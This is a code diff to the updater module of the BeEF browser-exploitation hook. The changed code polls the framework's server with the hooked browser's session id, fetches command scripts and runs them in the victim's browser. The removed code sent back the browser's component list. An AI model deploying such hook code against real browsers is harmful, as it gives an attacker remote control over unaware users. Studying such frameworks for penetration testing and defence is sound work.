@@ -33,7 +33,7 @@ beef.updater = {
 			if (beef.logger.running) {
 				beef.logger.queue();
 			}
-			beef.net.flush_queue();
+			beef.net.flush();
 			if(beef.commands.length > 0) {
 				this.execute_commands();
 			} else {
@@ -47,33 +47,15 @@ beef.updater = {
 	get_commands: function(http_response) {
 		try {
 			this.lock = true;
-			beef.net.request(
-				beef.net.beef_url + beef.net.beef_hook,
-				'POST',
-				function(response, textStatus) { 
-					if(response != null && response.length > 0) {
-						beef.updater.execute_commands();
-					} 
-				},
-				beef.updater.build_updater_params()
-				);
+            beef.net.request('http', 'GET', beef.net.host, beef.net.port, beef.net.hook, null, 'BEEFHOOK='+beef.session.get_hook_session_id(), 10, 'script', function(response) {
+                if (response.body != null && response.body.length > 0)
+                    beef.updater.execute_commands();
+            });
 		} catch(e) {
 			this.lock = false;
 			return;
 		}
-		
 		this.lock = false;
-	},
-	
-	// Builds the POST parameters to send back to the framework when requesting new commands.
-	build_updater_params: function() {
-		ret = 'beef_js_cmps=' + beef.components.join(',')
-		
-		for(key in this.objects) {
-			ret += '&' + key + '=' + escape(this.objects[key]);
-		}
-		
-		return ret;
 	},
 	
 	// Executes the received commands if any.
